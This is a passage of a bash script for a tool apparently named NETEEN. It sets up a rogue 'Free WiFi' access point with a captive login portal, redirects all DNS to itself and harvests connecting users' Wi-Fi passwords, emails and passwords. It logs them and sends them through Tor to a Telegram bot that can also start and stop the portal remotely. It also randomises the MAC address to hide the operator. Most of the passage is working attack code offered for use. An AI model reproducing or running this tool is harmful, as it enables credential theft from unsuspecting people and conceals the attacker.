dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
listen-address=192.168.1.1
address=/#/192.168.1.1
EOF
    chmod 600 "$RUNTIME_DIR/dnsmasq.conf"
    dnsmasq -C "$RUNTIME_DIR/dnsmasq.conf" --pid-file="$RUNTIME_DIR/dnsmasq.pid" 2>/dev/null
    sleep 2
    DNSMASQ_PID="$(cat "$RUNTIME_DIR/dnsmasq.pid" 2>/dev/null || echo "")"
    if [ -n "$DNSMASQ_PID" ] && kill -0 "$DNSMASQ_PID" 2>/dev/null; then
        echo -e "${GREEN}$(get_str 52)${NC}"
        return 0
    else
        echo -e "${RED}Failed to start DHCP${NC}"
        return 1
    fi
}

setup_webserver() {
    echo -e "${YELLOW}$(get_str 53)${NC}"
    if command -v systemctl >/dev/null; then
        systemctl stop apache2 2>/dev/null || true
    else
        pkill apache2 2>/dev/null || true
    fi
    local web_root
    web_root="$(generate_web_portal)"
    cat > "$RUNTIME_DIR/apache.conf" << EOF
Listen 192.168.1.1:80
DocumentRoot "$web_root"
<Directory "$web_root">
    Options -Indexes -FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
ErrorLog "$RUNTIME_DIR/apache_error.log"
CustomLog "$RUNTIME_DIR/apache_access.log" combined
EOF
    apache2 -f "$RUNTIME_DIR/apache.conf" -d "$RUNTIME_DIR" -k start 2>/dev/null || {
        echo -e "${RED}Failed to start Apache${NC}"
        return 1
    }
    sleep 2
    if ss -lntp | grep -q "192.168.1.1:80"; then
        echo -e "${GREEN}$(get_str 54)${NC}"
        return 0
    else
        echo -e "${RED}Apache not listening on expected port${NC}"
        return 1
    fi
}

setup_routing() {
    ORIG_IP_FORWARD="$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo 0)"
    sysctl -w net.ipv4.ip_forward=1 >/dev/null || die "Cannot enable ip_forward"
    local uplink
    uplink="$(ip route show default | grep -oP '(?<=dev )[^ ]+' | head -1)"
    if [ -z "$uplink" ]; then
        echo -e "${YELLOW}No default route found, internet sharing may not work.${NC}"
        uplink="eth0"
    fi
    iptables -N "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
    iptables -F "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
    iptables -t nat -N "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
    iptables -t nat -F "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
    iptables -t nat -A "$OWN_IPTABLES_CHAIN" -o "$uplink" -j MASQUERADE
    iptables -A "$OWN_IPTABLES_CHAIN" -i "$WIFI_IFACE" -j ACCEPT
    iptables -A "$OWN_IPTABLES_CHAIN" -m state --state ESTABLISHED,RELATED -j ACCEPT
    iptables -I FORWARD 1 -j "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
    iptables -t nat -I POSTROUTING 1 -j "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
    iptables -I INPUT -i "$WIFI_IFACE" -m tcp -p tcp --dport 80 -j ACCEPT
    iptables -I INPUT -i "$WIFI_IFACE" -m udp -p udp --dport 67 -j ACCEPT
    iptables -I INPUT -i "$WIFI_IFACE" -m udp -p udp --dport 53 -j ACCEPT
    iptables -I INPUT -i "$WIFI_IFACE" -j DROP
    return 0
}

# --------------------------------------------
# Cleanup
# --------------------------------------------
cleanup_once() {
    if [ "$CLEANUP_DONE" = "true" ]; then
        return
    fi
    CLEANUP_DONE="true"
    echo -e "${BLUE}$(get_str 55)${NC}"
    if [ -n "$HOSTAPD_PID" ] && kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        kill -TERM "$HOSTAPD_PID" 2>/dev/null || true
        wait "$HOSTAPD_PID" 2>/dev/null || true
    fi
    if [ -n "$DNSMASQ_PID" ] && kill -0 "$DNSMASQ_PID" 2>/dev/null; then
        kill -TERM "$DNSMASQ_PID" 2>/dev/null || true
        wait "$DNSMASQ_PID" 2>/dev/null || true
    fi
    if [ -n "$MONITOR_PID" ] && kill -0 "$MONITOR_PID" 2>/dev/null; then
        kill -TERM "$MONITOR_PID" 2>/dev/null || true
        wait "$MONITOR_PID" 2>/dev/null || true
    fi
    if [ -f "$RUNTIME_DIR/apache.conf" ]; then
        apache2 -f "$RUNTIME_DIR/apache.conf" -d "$RUNTIME_DIR" -k stop 2>/dev/null || true
    fi
    if iptables -L "$OWN_IPTABLES_CHAIN" >/dev/null 2>&1; then
        iptables -D FORWARD -j "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
        iptables -t nat -D POSTROUTING -j "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
        iptables -F "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
        iptables -X "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
        iptables -t nat -F "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
        iptables -t nat -X "$OWN_IPTABLES_CHAIN" 2>/dev/null || true
    fi
    if [ -n "$ORIG_IP_FORWARD" ]; then
        sysctl -w net.ipv4.ip_forward="$ORIG_IP_FORWARD" >/dev/null 2>&1 || true
    fi
    if [ -n "$ORIG_MAC" ] && [ "$MAC_CHANGED" = "true" ] && [ -n "$WIFI_IFACE" ]; then
        ip link set "$WIFI_IFACE" down 2>/dev/null || true
        ip link set dev "$WIFI_IFACE" address "$ORIG_MAC" 2>/dev/null || true
        ip link set "$WIFI_IFACE" up 2>/dev/null || true
    fi
    if command -v nmcli >/dev/null && [ -n "$WIFI_IFACE" ]; then
        nmcli device set "$WIFI_IFACE" managed yes 2>/dev/null || true
    fi
    if [ -n "$ORIG_APACHE_STATE" ] && [ "$ORIG_APACHE_STATE" = "running" ]; then
        if command -v systemctl >/dev/null; then
            systemctl start apache2 2>/dev/null || true
        fi
    fi
    rm -rf "$RUNTIME_DIR" 2>/dev/null || true
    echo -e "${GREEN}$(get_str 56)${NC}"
    trap - EXIT INT TERM HUP
}

on_exit() {
    local rc=$?
    cleanup_once
    exit "$rc"
}

on_signal() {
    exit 130
}

trap on_signal INT TERM HUP
trap on_exit EXIT

# --------------------------------------------
# Anonymity
# --------------------------------------------
enable_anonymity() {
    echo -e "${YELLOW}Enabling anonymity mode...${NC}"
    if command -v macchanger &>/dev/null; then
        ORIG_MAC="$(cat /sys/class/net/"$WIFI_IFACE"/address 2>/dev/null || echo "")"
        ip link set "$WIFI_IFACE" down
        macchanger -r "$WIFI_IFACE" | grep -E "New MAC" | sed 's/^/  /'
        ip link set "$WIFI_IFACE" up
        MAC_CHANGED="true"
        echo -e "${GREEN}$(get_str 103) $(ip link show "$WIFI_IFACE" | grep ether | awk '{print $2}')${NC}"
    else
        echo -e "${RED}macchanger not installed. Skipping MAC change.${NC}"
    fi
    if command -v tor &>/dev/null; then
        if ! pgrep -x tor > /dev/null; then
            echo -e "${YELLOW}Tor is not running. Attempting to start...${NC}"
            if command -v systemctl >/dev/null && systemctl start tor 2>/dev/null; then
                sleep 3
            elif command -v service >/dev/null && service tor start 2>/dev/null; then
                sleep 3
            else
                nohup tor > /tmp/tor.log 2>&1 &
                sleep 5
            fi
        fi
        if pgrep -x tor > /dev/null; then
            TOR_RUNNING="true"
            echo -e "${GREEN}$(get_str 104)${NC}"
        else
            echo -e "${RED}$(get_str 105)${NC}"
        fi
    else
        echo -e "${RED}Tor not installed. Skipping Tor proxy.${NC}"
    fi
}

toggle_anonymity() {
    if [ -f "/etc/neteen_anon_mode" ]; then
        source "/etc/neteen_anon_mode" 2>/dev/null || true
        if [ "$ANON_MODE" = "true" ]; then
            ANON_MODE="false"
            echo -e "${YELLOW}Anonymity mode disabled.${NC}"
        else
            ANON_MODE="true"
            echo -e "${GREEN}Anonymity mode enabled.${NC}"
        fi
    else
        ANON_MODE="true"
        echo -e "${GREEN}Anonymity mode enabled.${NC}"
    fi
    echo "ANON_MODE=\"$ANON_MODE\"" > /etc/neteen_anon_mode
    sleep 1
}

# --------------------------------------------
# Telegram Bot
# --------------------------------------------
load_bot_config() {
    if [ -f "$BOT_CONFIG_FILE" ]; then
        # shellcheck disable=SC1090
        . "$BOT_CONFIG_FILE"
        if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
            return 0
        fi
    fi
    return 1
}

save_bot_config() {
    python3 - <<PY > "$BOT_CONFIG_FILE"
import json, os, sys, tempfile
data = {"token": "$TELEGRAM_BOT_TOKEN", "chat_id": "$TELEGRAM_CHAT_ID"}
with tempfile.NamedTemporaryFile(mode='w', dir=os.path.dirname(sys.argv[0]), delete=False) as tf:
    json.dump(data, tf)
    tf.flush()
    os.fsync(tf.fileno())
os.chmod(tf.name, 0o600)
os.replace(tf.name, sys.argv[0])
PY
}

send_telegram_message() {
    local msg="$1"
    if ! load_bot_config; then
        return 1
    fi
    local curl_cmd="curl -sS --connect-timeout 5 --max-time 10"
    if [ "$TOR_RUNNING" = "true" ]; then
        curl_cmd="$curl_cmd --socks5-hostname 127.0.0.1:9050"
    fi
    $curl_cmd -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        --data-urlencode "text=${msg}" \
        >/dev/null 2>&1 || return 1
    return 0
}

bot_is_running() {
    [ -f "$BOT_PID_FILE" ] || return 1
    local pid
    pid="$(cat "$BOT_PID_FILE" 2>/dev/null)"
    [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null
}

start_bot() {
    if ! load_bot_config; then
        echo -e "${RED}$(get_str 87) — $(get_str 90) first.${NC}"
        sleep 2
        return 1
    fi
    if bot_is_running; then
        echo -e "${YELLOW}$(get_str 88) (PID: $(cat "$BOT_PID_FILE")).${NC}"
        echo -e "${YELLOW}$(get_str 24)${NC}"
        read -r
        return 0
    fi
    local SCRIPT_PATH
    SCRIPT_PATH="$(readlink -f "$0")"
    cat > "$BOT_PY_SCRIPT" << 'PYEOF'
#!/usr/bin/env python3
import os, sys, time, json, subprocess, requests, threading, socket, socks
from threading import Thread

CONFIG_FILE = "/etc/neteen_bot.conf"
ERROR_LOG = "/run/neteen/bot_error.log"
BOT_LOG = "/run/neteen/bot.log"
SCRIPT_PATH = sys.argv[1] if len(sys.argv) > 1 else "/usr/local/bin/NETEEN.sh"

def log_error(msg):
    with open(ERROR_LOG, 'a') as f:
        f.write(time.strftime("%Y-%m-%d %H:%M:%S") + " - " + msg + "\n")

def log(msg):
    with open(BOT_LOG, 'a') as f:
        f.write(time.strftime("%Y-%m-%d %H:%M:%S") + " - " + msg + "\n")

def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            data = json.load(f)
        return data.get('token', ''), data.get('chat_id', '')
    except:
        return '', ''

def configure_proxy():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(("127.0.0.1", 9050))
        s.close()
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        log("Using Tor SOCKS5 proxy.")
    except:
        log("Tor not available, direct connection.")

def send_message(chat_id, text, token):
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
            timeout=(5,10)
        )
        if not r.ok:
            log_error(f"send_message HTTP {r.status_code}: {r.text[:300]}")
    except Exception as e:
        log_error(f"send_message: {e}")

def get_updates(token, offset):
    try:
        r = requests.get(
            f"https://api.telegram.org/bot{token}/getUpdates",
            params={"offset": offset, "timeout": 20},
            timeout=(5,25)
        )
        if not r.ok:
            log_error(f"get_updates HTTP {r.status_code}")
            return []
        data = r.json()
        if not data.get('ok'): return []
        return data.get('result', [])
    except Exception as e:
        log_error(f"get_updates: {e}")
        return []

def process_running(name):
    try:
        return subprocess.run(["pgrep", "-x", name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
    except:
        return False

def portal_status():
    return "Portal is running." if process_running("hostapd") else "Portal is stopped."

def credentials_log_tail():
    try:
        with open("/run/neteen/events.jsonl", "r") as f:
            lines = f.readlines()[-5:]
        return "".join(lines)
    except:
        return "No credentials logged."

def process_command(chat_id, text, token):
    cmd = text.strip().split()[0].split('@')[0].lower()
    if cmd == "/start":
        send_message(chat_id, "<b>NETEEN Bot</b>\n\nCommands:\n/status\n/startportal\n/stopportal\n/credentials\n/help", token)
    elif cmd == "/help":
        send_message(chat_id, "Commands: /status, /startportal, /stopportal, /credentials", token)
    elif cmd == "/status":
        send_message(chat_id, portal_status(), token)
    elif cmd == "/startportal":
        subprocess.Popen(["sudo", SCRIPT_PATH, "--auto-portal"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        send_message(chat_id, "Portal start command sent. Check /status.", token)
    elif cmd == "/stopportal":
        subprocess.Popen(["sudo", SCRIPT_PATH, "--stop-portal"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        send_message(chat_id, "Portal stop command sent.", token)
    elif cmd == "/credentials":
        msg = "<b>Last captured credentials:</b>\n<pre>" + credentials_log_tail() + "</pre>"
        send_message(chat_id, msg, token)
    else:
        send_message(chat_id, "Unknown command. Type /help", token)

def main():
    configure_proxy()
    token, allowed_chat_id = load_config()
    if not token or not allowed_chat_id:
        log_error("Token or Chat ID missing")
        return 1
    offset = None
    log("Bot started.")
    while True:
        try:
            updates = get_updates(token, offset)
            for upd in updates:
                offset = upd['update_id'] + 1
                msg = upd.get('message')
                if not msg: continue
                chat = msg.get('chat', {})
                chat_id = str(chat.get('id'))
                text = msg.get('text')
                if not text: continue
                if chat_id != str(allowed_chat_id):
                    log(f"Ignored from {chat_id}")
                    continue
                Thread(target=process_command, args=(chat_id, text, token), daemon=True).start()
        except KeyboardInterrupt:
            break
        except Exception as e:
            log_error(f"main loop: {e}")
            time.sleep(3)
    return 0
if __name__ == "__main__":
    sys.exit(main())
PYEOF
    chmod 700 "$BOT_PY_SCRIPT"
    nohup python3 "$BOT_PY_SCRIPT" "$SCRIPT_PATH" >> "$BOT_LOG" 2>>"$ERROR_LOG" &
    local pid=$!
    echo "$pid" > "$BOT_PID_FILE"
    sleep 1
    if kill -0 "$pid" 2>/dev/null; then
        echo -e "${GREEN}$(get_str 98) (PID: $pid)${NC}"
        send_telegram_message "NETEEN bot is online."
    else
        echo -e "${RED}Bot failed to start. Check $ERROR_LOG${NC}"
        rm -f "$BOT_PID_FILE"
        return 1
    fi
    echo -e "${YELLOW}$(get_str 24)${NC}"
    read -r
    return 0
}

stop_bot() {
    if ! bot_is_running; then
        echo -e "${YELLOW}$(get_str 89)${NC}"
        echo -e "${YELLOW}$(get_str 24)${NC}"
        read -r
        return 0
    fi
    local pid
    pid="$(cat "$BOT_PID_FILE")"
    kill "$pid" 2>/dev/null || true
    sleep 1
    kill -9 "$pid" 2>/dev/null || true
    rm -f "$BOT_PID_FILE"
    echo -e "${GREEN}$(get_str 99) (PID $pid).${NC}"
    send_telegram_message "NETEEN bot is offline."
    echo -e "${YELLOW}$(get_str 24)${NC}"
    read -r
}

bot_status() {
    echo ""
    if load_bot_config; then
        echo -e "${GREEN}$(get_str 86)${NC}"
        echo "Token: ${TELEGRAM_BOT_TOKEN:0:10}..."
        echo "Chat ID: $TELEGRAM_CHAT_ID"
    else
        echo -e "${RED}$(get_str 87)${NC}"
    fi
    if bot_is_running; then
        echo -e "${GREEN}$(get_str 88) (PID: $(cat "$BOT_PID_FILE"))${NC}"
    else
        echo -e "${RED}$(get_str 89)${NC}"
    fi
    if pgrep -x tor >/dev/null; then
        echo -e "${GREEN}Tor: running${NC}"
    else
        echo -e "${YELLOW}Tor: stopped${NC}"
    fi
    echo -e "${YELLOW}$(get_str 24)${NC}"
    read -r
}

configure_bot() {
    show_header
    echo -e "${CYAN}$(get_str 90)${NC}"
    echo ""
    read -s -p "$(get_str 95) " TELEGRAM_BOT_TOKEN
    echo ""
    read -p "$(get_str 96) " TELEGRAM_CHAT_ID
    if [[ -z "$TELEGRAM_BOT_TOKEN" || -z "$TELEGRAM_CHAT_ID" ]]; then
        echo -e "${RED}Token and Chat ID required.${NC}"
        echo -e "${YELLOW}$(get_str 24)${NC}"
        read -r
        return 1
    fi
    if [[ ! "$TELEGRAM_CHAT_ID" =~ ^-?[0-9]+$ ]]; then
        echo -e "${RED}Invalid Chat ID format.${NC}"
        echo -e "${YELLOW}$(get_str 24)${NC}"
        read -r
        return 1
    fi
    save_bot_config
    echo -e "${GREEN}$(get_str 97)${NC}"
    send_telegram_message "NETEEN bot configured successfully."
    echo -e "${GREEN}Test message sent.${NC}"
    echo -e "${YELLOW}$(get_str 24)${NC}"
    read -r
}

telegram_menu() {
    while true; do
        show_header
        echo ""
        echo "╔════════════════════════════════════════════╗"
        echo "           $(get_str 100)                    "
        echo "╠════════════════════════════════════════════╣"
        if load_bot_config; then
            echo "║  Status: $(get_str 86)"
            echo "║  Token: ${TELEGRAM_BOT_TOKEN:0:10}..."
            echo "║  Chat ID: $TELEGRAM_CHAT_ID"
        else
            echo "║  Status: $(get_str 87)"
            echo "║  Token: -"
            echo "║  Chat ID: -"
        fi
        if bot_is_running; then
            echo "║  Bot: $(get_str 88) (PID: $(cat "$BOT_PID_FILE"))"
        else
            echo "║  Bot: $(get_str 89)"
        fi
        echo "╠════════════════════════════════════════════╣"
        echo "   1) $(get_str 90)"
        echo "   2) $(get_str 91)"
        echo "   3) $(get_str 92)"
        echo "   4) $(get_str 93)"
        echo "   0) $(get_str 94)"
        echo "╚════════════════════════════════════════════╝"
        echo ""
        read -p "$(echo -e ${YELLOW}$(get_str 75) [0-4]: ${NC})" opt
        case "$opt" in
            1) configure_bot ;;
            2) start_bot ;;
            3) stop_bot ;;
            4) bot_status ;;
            0) return 0 ;;
            *) echo -e "${RED}$(get_str 14)${NC}"; sleep 1 ;;
        esac
    done
}

# --------------------------------------------
# Network Scanner
# --------------------------------------------
network_scanner() {
    show_header
    echo -e "${PURPLE}$(get_str 21)${NC}"
    echo -e "${YELLOW}$(get_str 22)${NC}"
    echo ""
    local iface
    iface="$(iw dev 2>/dev/null | grep -E "^[[:space:]]+Interface" | awk '{print $2}' | head -1)"
    if [ -z "$iface" ]; then
        echo -e "${RED}$(get_str 23)${NC}"
    else
        echo -e "${CYAN}════════════════════════════════════════════${NC}"
        echo -e "${CYAN}           $(get_str 77)            ${NC}"
        echo -e "${CYAN}════════════════════════════════════════════${NC}"
        echo ""
        local temp_file="$(mktemp)"
        iwlist "$iface" scan 2>/dev/null > "$temp_file" || echo -e "${YELLOW}Scan failed (maybe interface is busy).${NC}"
        awk '
        BEGIN { essid=""; channel=""; quality=""; first=1; }
        /Cell [0-9]+/ {
            if (!first) {
                if (essid=="") essid="(hidden)";
                print "Network: " essid;
                print "  Channel: " channel;
                print "  Signal: " quality;
                print "──────────────────────────────────────────";
            }
            first=0; essid=""; channel=""; quality="";
        }
        /ESSID:/ { essid=substr($0, index($0,"ESSID:")+7); gsub(/"/,"",essid); gsub(/^[ \t]+|[ \t]+$/,"",essid); }
        /Channel:/ { channel=$0; gsub(/.*Channel:/,"",channel); gsub(/\).*/,"",channel); gsub(/ /,"",channel); }
        /Quality=/ { quality=$0; gsub(/.*Quality=/,"",quality); gsub(/ .*/,"",quality); split(quality,arr,"/"); if(length(arr)==2) { percentage=int((arr[1]/arr[2])*100); quality=percentage"%"; } }
        END {
            if (essid!="" || channel!="" || quality!="") {
                if (essid=="") essid="(hidden)";
                print "Network: " essid;
                print "  Channel: " channel;
                print "  Signal: " quality;
                print "──────────────────────────────────────────";
            }
        }' "$temp_file" | while read -r line; do
            if echo "$line" | grep -q "Network:"; then
                network=$(echo "$line" | sed 's/Network: //')
                echo -e "${CYAN}$(get_str 69): ${WHITE}$network${NC}"
            elif echo "$line" | grep -q "Channel:"; then
                channel=$(echo "$line" | sed 's/Channel: //')
                echo -e "${WHITE}  $(get_str 70): $channel${NC}"
            elif echo "$line" | grep -q "Signal:"; then
                signal=$(echo "$line" | sed 's/Signal: //')
                echo -e "${WHITE}  $(get_str 71): $signal${NC}"
            else
                echo "$line"
            fi
        done
        rm -f "$temp_file"
    fi
    echo -e "${YELLOW}$(get_str 24)${NC}"
    read -r
}

# --------------------------------------------
# Main Stealth Portal
# --------------------------------------------
stealth_portal() {
    require_root
    show_header
    echo -e "${PURPLE}$(get_str 20)${NC}"
    
    echo -en "${YELLOW}$(get_str 102)${NC}"
    read -r anon_choice
    if [[ "$anon_choice" =~ ^[Yy]$ ]]; then
        ANON_MODE="true"
        echo "ANON_MODE=\"true\"" > /etc/neteen_anon_mode
    else
        ANON_MODE="false"
        echo "ANON_MODE=\"false\"" > /etc/neteen_anon_mode
    fi

    customize_portal

    echo -en "${YELLOW}$(get_str 25) ${NC}"
    read AP_NAME
    [ -z "$AP_NAME" ] && AP_NAME="Free WiFi"
    if [[ ${#AP_NAME} -gt 32 || "$AP_NAME" = *$'\n'* ]]; then
        echo -e "${RED}Invalid SSID (max 32 chars, no newlines).${NC}"
        echo -e "${YELLOW}$(get_str 24)${NC}"
        read -r
        return 1
    fi

    echo -en "${YELLOW}$(get_str 84)${NC}"
    read -r SAVE_TO_FILE
    SAVE_TO_FILE="${SAVE_TO_FILE:-n}"

    if [ "$SAVE_TO_FILE" = "y" ] || [ "$SAVE_TO_FILE" = "Y" ]; then
        CREDENTIALS_FILE="$(pwd)/neteen_credentials_$(date +%Y%m%d_%H%M%S).txt"
        echo -e "${GREEN}Credentials will be saved to: $CREDENTIALS_FILE${NC}"
        sleep 1
    fi

    if ! select_interface; then
        echo -e "${YELLOW}$(get_str 24)${NC}"
        read -r
        return 1
    fi
    WIFI_IFACE="$selected_interface"

    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "             $(get_str 76)                    "
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"

    ORIG_IP_FORWARD="$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo 0)"
    if command -v systemctl >/dev/null; then
        ORIG_APACHE_STATE="$(systemctl is-active apache2 2>/dev/null || echo "inactive")"
    else
        ORIG_APACHE_STATE="unknown"
    fi

    if [ "$ANON_MODE" = "true" ]; then
        enable_anonymity
    fi

    echo -e "${YELLOW}Preparing system...${NC}"
    if command -v nmcli >/dev/null; then
        nmcli device set "$WIFI_IFACE" managed no 2>/dev/null || true
    fi
    pkill wpa_supplicant 2>/dev/null || true
    pkill dhclient 2>/dev/null || true
    sleep 1

    setup_interface "$WIFI_IFACE" || { cleanup_once; return 1; }
    setup_webserver || { cleanup_once; return 1; }
    start_ap "$WIFI_IFACE" "$AP_NAME" || { cleanup_once; return 1; }
    start_dhcp "$WIFI_IFACE" || { cleanup_once; return 1; }
    setup_routing || { cleanup_once; return 1; }

    show_header
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "               $(get_str 57)                  "
    echo "╠════════════════════════════════════════════╣"
    printf "   ${WHITE}SSID:${NC} %-35s  \n" "$AP_NAME"
    printf "   ${WHITE}$(get_str 58):${NC} %-28s  \n" "$WIFI_IFACE"
    printf "   ${WHITE}$(get_str 59):${NC} %-29s  \n" "192.168.1.10-100"
    echo "║  $(get_str 60)                             ║"
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"

    echo -e "${YELLOW}$(get_str 61)${NC}"
    echo "──────────────────────────────────────────"
    echo -e "${GREEN}$(get_str 78)${NC}"

    (
        tail -f "$EVENT_LOG" 2>/dev/null | while read -r line; do
            data="$(echo "$line" | jq -r '.time + "|" + .ip + "|" + .device + "|" + .wifi + "|" + .email + "|" + .pass' 2>/dev/null)"
            if [ -n "$data" ]; then
                IFS='|' read -r time ip device wifi email pass <<< "$data"
                echo ""
                echo -e "${CYAN}════════════════════════════════════════════${NC}"
                echo -e "${CYAN}            $(get_str 62)            ${NC}"
                echo -e "${CYAN}════════════════════════════════════════════${NC}"
                echo -e "${WHITE}$(get_str 63):${NC} $time"
                echo -e "${WHITE}$(get_str 64):${NC} $ip"
                echo -e "${WHITE}$(get_str 65):${NC} $device"
                echo -e "${RED}$(get_str 66):${NC} $wifi"
                echo -e "${BLUE}$(get_str 67):${NC} $email"
                echo -e "${RED}$(get_str 68):${NC} $pass"
                echo -e "${CYAN}──────────────────────────────────────────${NC}"
                if [ "$SAVE_TO_FILE" = "y" ] || [ "$SAVE_TO_FILE" = "Y" ]; then
                    echo "[$time] SSID: $AP_NAME, IP: $ip, Device: $device, WiFi: $wifi, Email: $email, Pass: $pass" >> "$CREDENTIALS_FILE"
                    echo -e "${GREEN}Saved to file.${NC}"
                fi
                if load_bot_config; then
                    msg="New credentials captured:\nTime: $time\nDevice: $device\nIP: $ip\nWiFi: <code>$wifi</code>\nEmail: $email\nPass: <code>$pass</code>"
                    send_telegram_message "$msg"
                fi
            fi
        done
    ) &
    MONITOR_PID=$!

    wait "$HOSTAPD_PID" 2>/dev/null || true
    cleanup_once
}

# --------------------------------------------
# Auto Portal (for Telegram)
# --------------------------------------------
auto_portal() {
    require_root
    AP_NAME="FreeWiFi"
    if [ -f "$PORTAL_SSID_FILE" ]; then
        AP_NAME=$(cat "$PORTAL_SSID_FILE" 2>/dev/null || echo "FreeWiFi")
    fi
    WIFI_IFACE="$(iw dev 2>/dev/null | grep -E "^[[:space:]]+Interface" | awk '{print $2}' | head -1)"
    if [ -z "$WIFI_IFACE" ]; then
        echo "No wireless interface found." >&2
        exit 1
    fi
    if [ -f "/etc/neteen_anon_mode" ]; then
        source "/etc/neteen_anon_mode" 2>/dev/null || true
    fi
    if [ "$ANON_MODE" = "true" ]; then
        enable_anonymity
    fi
    if [ ! -f "$CONFIG_FILE" ]; then
        write_json_config \
            "Network Login" "Enter credentials" "WiFi Password" "Email" "Password" \
            "Connect" "Connection successful" "#1a1a1a" "#2d2d2d" "#ffffff" "#007cba" "#404040" "Default"
    fi
    ORIG_IP_FORWARD="$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo 0)"
    if command -v systemctl >/dev/null; then
        ORIG_APACHE_STATE="$(systemctl is-active apache2 2>/dev/null || echo "inactive")"
    else
        ORIG_APACHE_STATE="unknown"
    fi
    if command -v nmcli >/dev/null; then
        nmcli device set "$WIFI_IFACE" managed no 2>/dev/null || true
    fi
    pkill wpa_supplicant 2>/dev/null || true
    pkill dhclient 2>/dev/null || true
    sleep 1
    setup_interface "$WIFI_IFACE" || { cleanup_once; exit 1; }
    setup_webserver || { cleanup_once; exit 1; }
    start_ap "$WIFI_IFACE" "$AP_NAME" || { cleanup_once; exit 1; }
    start_dhcp "$WIFI_IFACE" || { cleanup_once; exit 1; }
    setup_routing || { cleanup_once; exit 1; }
    (
        tail -f "$EVENT_LOG" 2>/dev/null | while read -r line; do
            data="$(echo "$line" | jq -r '.time + "|" + .ip + "|" + .device + "|" + .wifi + "|" + .email + "|" + .pass' 2>/dev/null)"
            if [ -n "$data" ]; then
                IFS='|' read -r time ip device wifi email pass <<< "$data"
                if load_bot_config; then
                    msg="New credentials captured:\nTime: $time\nDevice: $device\nIP: $ip\nWiFi: <code>$wifi</code>\nEmail: $email\nPass: <code>$pass</code>"
                    send_telegram_message "$msg"
                fi
            fi
        done
    ) &
    MONITOR_PID=$!
    wait "$HOSTAPD_PID" 2>/dev/null || true
    cleanup_once
    exit 0
}

# --------------------------------------------
# Main Menu and CLI
# --------------------------------------------
show_main_menu() {
    echo -e "${WHITE}"
    echo "╔════════════════════════════════════════════╗"
    echo "                  $(get_str 73)               "
    echo "╠════════════════════════════════════════════╣"
    echo "   1) $(get_str 1)                            "
    echo "   2) $(get_str 2)                            "
    echo "   3) $(get_str 83)                           "
    echo "   4) $(get_str 100)                         "
    echo "   5) $(get_str 101) (toggle)                 "
    echo "   0) $(get_str 3)                            "
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
}

handle_args() {
    local cmd="$1"
    case "$cmd" in
        --auto-portal)
            auto_portal
            ;;
        --stop-portal)
            require_root
            cleanup_once
            exit 0
            ;;
        start)
            require_root
            stealth_portal
            ;;
        stop)
            require_root
            cleanup_once
            exit 0
            ;;
        status)
            if pgrep hostapd > /dev/null; then
                echo "Portal is running."
            else
                echo "Portal is stopped."
            fi
            exit 0
            ;;
        scan)
            network_scanner
            ;;
        help|--help|-h)
            echo "NETEEN commands:"
            echo "  start         - Launch stealth portal"
            echo "  stop          - Stop portal and cleanup"
            echo "  status        - Check if portal is running"
            echo "  scan          - Scan for Wi-Fi networks"
            echo "  help          - Show this help"
            echo "  --auto-portal - (internal) Auto-start portal for Telegram"
            echo "  --stop-portal - (internal) Stop portal for Telegram"
            exit 0
            ;;
        *)
            echo -e "${RED}Unknown command: $cmd.${NC}"
            exit 1
            ;;
    esac
}

# --------------------------------------------
# Initialization
# --------------------------------------------
init_languages
load_saved_language
detect_platform

if [ $# -gt 0 ]; then
    handle_args "$1"
    exit 0
fi

while true; do
    show_header
    show_main_menu
    read -p "$(echo -e ${YELLOW}$(get_str 75) [0-5]: ${NC})" choice
    case "$choice" in
        1)
            require_root
            install_dependencies
            stealth_portal
            ;;
        2)
            network_scanner
            ;;
        3)
            select_language
            ;;
        4)
            telegram_menu
            ;;
        5)
            toggle_anonymity
            ;;
        0)
            echo -e "${GREEN}$(get_str 72)${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}$(get_str 106)${NC}"
            sleep 1
            ;;
    esac
done